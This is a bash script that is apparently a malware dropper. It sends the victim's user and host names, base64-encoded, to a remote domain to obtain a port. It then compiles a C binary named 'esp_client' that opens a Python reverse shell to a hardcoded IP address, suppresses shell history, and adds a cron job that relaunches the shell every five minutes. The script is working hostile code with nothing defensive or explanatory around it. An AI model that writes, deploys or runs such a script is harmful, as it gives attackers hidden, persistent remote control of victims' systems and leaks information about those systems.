#!/bin/bash

user="suser"
username=$(whoami)
hostname=$(hostname)

data=$(echo -n "$user:$username:$hostname" | base64)

domain_name="proxy1.cryptopredictor.org"

received_port=$(curl -L "https://$domain_name/report?data=$data")
received_port=$(echo $received_port | sed "s/%//g")

echo "$received_port"

parent_path="$HOME/.local/bin"
c_code="$parent_path/esp_client.c"
script_path="$parent_path/esp_client"
mkdir -p "$parent_path"

cat << EOF > "$c_code"
#include <stdlib.h>
const char *script_content = 
    "#!/bin/bash\n"
    "\n"
    "python3 -c \"\n"
    "import socket,subprocess,os,pty,sys\n"
    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
    "s.connect(('40.233.2.200',$received_port))\n"
    "fd=s.fileno()\n"
    "os.dup2(fd,0)\n"
    "os.dup2(fd,1)\n"
    "os.dup2(fd,2)\n"
    "os.putenv('HISTFILE','/dev/null')\n"
    "os.putenv('TERM','xterm')\n"
    "pty.spawn(['/bin/bash','-i'])\n"
    "s.close()\n"
    "\"\n"
    "";
int main() {
    return system(script_content);
}
EOF
gcc "$c_code" -o "$script_path"
echo "$script_path"
nohup "$script_path" > /dev/null 2>&1 &
#rm "$c_code"

CRON_JOB="*/5 * * * * bash $script_path"
if ! crontab -l 2>/dev/null | grep -Fxq "$CRON_JOB"; then
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
else
    echo "Cron job already exists. Skipping."
fi
